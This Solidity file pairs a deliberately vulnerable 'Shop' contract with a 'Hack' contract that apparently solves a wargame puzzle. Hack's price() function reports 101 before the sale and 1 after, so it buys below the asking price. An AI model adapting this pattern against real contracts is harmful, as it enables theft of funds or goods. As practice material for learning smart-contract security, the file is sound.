// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBuyer {
  function price() external view returns (uint256);
}

contract Shop {
  uint256 public price = 100;
  bool public isSold;

  function buy() public {
    IBuyer _buyer = IBuyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract Hack {

    bool public check;

    Shop target;

    constructor(address _target){
        target = Shop(_target);
    }

    function pwn() external {
        target.buy();
    }

    function price() public view returns(uint256) {
        if(!bool(target.isSold())){
            return 101;
        }
        else{
            return 1;
        }
    }
}